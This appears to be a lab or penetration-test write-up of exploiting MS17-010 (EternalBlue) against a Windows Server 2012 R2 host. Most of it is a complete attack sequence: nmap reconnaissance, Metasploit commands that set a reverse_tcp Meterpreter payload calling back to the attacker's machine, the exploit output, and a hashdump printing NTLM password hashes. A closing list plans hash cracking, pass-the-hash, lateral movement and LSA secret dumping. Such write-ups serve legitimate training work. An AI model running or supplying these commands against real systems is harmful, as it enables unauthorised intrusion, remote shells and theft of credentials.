# MS17-010 EternalBlue — Windows Server 2012 R2

**CVE:** CVE-2017-0143 through CVE-2017-0148
**Target:** 10.80.137.69 (Windows Server 2012 R2 Datacenter,
hostname WIN-JO6REVNMMMP)
**Attacker:** Kali Linux (192.168.129.38)
**Date:** 25 September 2026
**Result:** Meterpreter session as NT AUTHORITY\SYSTEM, hashes dumped

## Summary

Exploited MS17-010 (EternalBlue) to obtain a SYSTEM-level
Meterpreter session on a Windows Server 2012 R2 target. Dumped
local NTLM password hashes for three accounts.

## 1. Reconnaissance

    sudo nmap -sV -Pn 10.80.137.69

Key findings:

| Port | Service | Version |
|------|---------|---------|
| 135  | msrpc   | Microsoft Windows RPC |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn |
| 445  | microsoft-ds | Windows Server 2008 R2-2012 SMB |
| 3389 | ms-wbt-server | RDP |
| 5985 | http    | WinRM |
| 49152-49175 | msrpc | Windows RPC |

**Target OS:** Windows Server 2012 R2 Datacenter (6.3 Build 9600)

## 2. Vulnerability Identification

    searchsploit ms17-010

Relevant results:

- Windows 7/2008 R2 - EternalBlue SMB RCE -> windows/remote/42031.py
- Windows 7/8.1/2008 R2/2012 R2/2016 R2 - EternalBlue -> windows/remote/42315.py
- Windows 8/8.1/2012 R2 (x64) - EternalBlue -> windows_x86-64/remote/42030.py
- Windows Server 2008 R2 (x64) - SrvOs2FeaToNt -> windows_x86-64/remote/41987.py

**CVE:** CVE-2017-0143 through CVE-2017-0148

**Background:** EternalBlue exploits a buffer overflow in
SrvOs2FeaToNt in srv.sys. A size calculation error in
SrvOs2FeaListSizeToNt allows the kernel pool to be groomed and
overwritten, leading to RCE via srvnet!SrvNetWskReceiveComplete.
Developed by the NSA Equation Group, leaked by Shadow Brokers
in 2017, and used in WannaCry and NotPetya.

## 3. Exploitation

    msfconsole -q
    msf > search ms17_010
    msf > use exploit/windows/smb/ms17_010_eternalblue
    msf > set RHOSTS 10.80.137.69
    msf > set LHOST 192.168.129.38
    msf > set payload windows/x64/meterpreter/reverse_tcp
    msf > run

Output:

    [+] 10.80.137.69:445 - Host is likely VULNERABLE to MS17-010!
        - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
    [+] 10.80.137.69:445 - got good NT Trans response
    [+] 10.80.137.69:445 - SMB1 session setup allocate nonpaged
        pool success
    [+] 10.80.137.69:445 - good response status for nx:
        INVALID_PARAMETER
    [*] Sending stage (255678 bytes) to 10.80.137.69
    [*] Meterpreter session 1 opened
        (192.168.129.38:4444 -> 10.80.137.69:49330)

## 4. Post-Exploitation

    meterpreter > sysinfo
    Computer        : WIN-JO6REVNMMMP
    OS              : Windows Server 2012 R2 (6.3 Build 9600)
    Architecture    : x64
    Meterpreter     : x64/windows

    meterpreter > getsystem
    [-] Already running as SYSTEM

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Immediately SYSTEM — no privilege escalation needed. The
exploit runs in kernel context.

## 5. Lessons Learned

1. EternalBlue gives instant SYSTEM. No privesc step required.
   This is why it was so devastating.
2. The check module is reliable. auxiliary/scanner/smb/smb_ms17_010
   confirmed the target before the exploit ran.
3. The exploit output tells the story — each line is a step in
   the kernel pool grooming process.
4. EternalBlue can crash targets. The module warns it may not
   trigger 100% of the time and should be run continuously.
   It worked first try here.
5. Hashes are credentials. NTLM hashes can be cracked offline
   with Hashcat, or used directly for pass-the-hash.
6. This is the exploit behind WannaCry. Understanding it is
   understanding modern ransomware history.

## 6. Next Steps

- Crack hashes: hashcat -m 1000 hashes.txt wordlist.txt
- Try pass-the-hash with Jon's hash
- Enumerate the workgroup for lateral movement
- Check for other vulnerable hosts on 10.80.137.0/24
- Dump LSA secrets: run post/windows/gather/lsa_secrets
